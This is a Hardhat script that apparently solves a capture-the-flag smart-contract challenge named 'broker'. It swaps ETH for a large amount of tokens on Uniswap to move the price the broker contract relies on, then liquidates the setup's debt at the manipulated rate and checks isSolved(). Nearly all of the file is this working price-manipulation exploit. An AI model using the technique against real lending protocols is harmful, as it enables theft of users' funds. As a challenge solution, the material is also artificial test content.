import IUniswapV2Pair from '@uniswap/v2-core/build/IUniswapV2Pair.json'
import IUniswapV2Router02 from '@uniswap/v2-periphery/build/IUniswapV2Router02.json'
import { Contract } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'

task('broker')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/broker/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/broker/Setup.sol:Setup')
      ).deploy({ value: parseEther('50') })
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const weth = await ethers.getContractAt(
      'contracts/broker/Broker.sol:WETH9',
      '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    )
    console.log('WETH9')
    console.log('  at', weth.address)

    const token = await ethers.getContractAt(
      'contracts/broker/Setup.sol:Token',
      await setup.token(),
    )
    console.log('Token')
    console.log('  at', token.address)

    const router = await ethers.getContractAt(
      IUniswapV2Router02.abi,
      '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
    )
    console.log('Router')
    console.log('  at', router.address)

    const pair = await ethers.getContractAt(
      IUniswapV2Pair.abi,
      await setup.pair(),
    )
    console.log('Pair')
    console.log('  at', pair.address)

    const broker = await ethers.getContractAt('Broker', await setup.broker())
    console.log('Broker')
    console.log('  at', broker.address)

    // perform exploit

    console.log('Signer')
    console.log('  bal ETH', formatEther(await weth.balanceOf(signer.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(signer.address)))
    console.log('Setup')
    console.log('  bal ETH', formatEther(await weth.balanceOf(setup.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(setup.address)))
    console.log('Pair')
    console.log('  bal ETH', formatEther(await weth.balanceOf(pair.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(pair.address)))
    console.log('Broker')
    console.log('  bal ETH', formatEther(await weth.balanceOf(broker.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(broker.address)))
    console.log('  rate', (await broker.rate()).toString())
    console.log('  debt', formatEther(await broker.debt(setup.address)))
    console.log('  safeDebt', formatEther(await broker.safeDebt(setup.address)))

    // buy TOK with eth

    // function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    //   external
    //   payable
    //   returns (uint[] memory amounts);
    const amount = parseEther('190000')
    await router.swapETHForExactTokens(
      amount,
      [weth.address, token.address],
      signer.address,
      (await router.provider.getBlock('latest')).timestamp + 1000,
      { value: parseEther('50') },
    )

    console.log('Signer')
    console.log('  bal ETH', formatEther(await weth.balanceOf(signer.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(signer.address)))
    console.log('Broker')
    console.log('  bal ETH', formatEther(await weth.balanceOf(broker.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(broker.address)))
    console.log('  rate', (await broker.rate()).toString())
    console.log('  debt', formatEther(await broker.debt(setup.address)))
    console.log('  safeDebt', formatEther(await broker.safeDebt(setup.address)))

    // liquidate

    console.log('Payment', formatEther(amount.div(await broker.rate())))

    await token.approve(broker.address, amount)
    await broker.liquidate(setup.address, amount)

    console.log('Signer')
    console.log('  bal ETH', formatEther(await weth.balanceOf(signer.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(signer.address)))
    console.log('Broker')
    console.log('  bal ETH', formatEther(await weth.balanceOf(broker.address)))
    console.log('  bal TOK', formatEther(await token.balanceOf(broker.address)))
    console.log('  rate', (await broker.rate()).toString())
    console.log('  debt', formatEther(await broker.debt(setup.address)))
    console.log('  safeDebt', formatEther(await broker.safeDebt(setup.address)))

    // verify

    console.log('Success?', await setup.isSolved())
  })
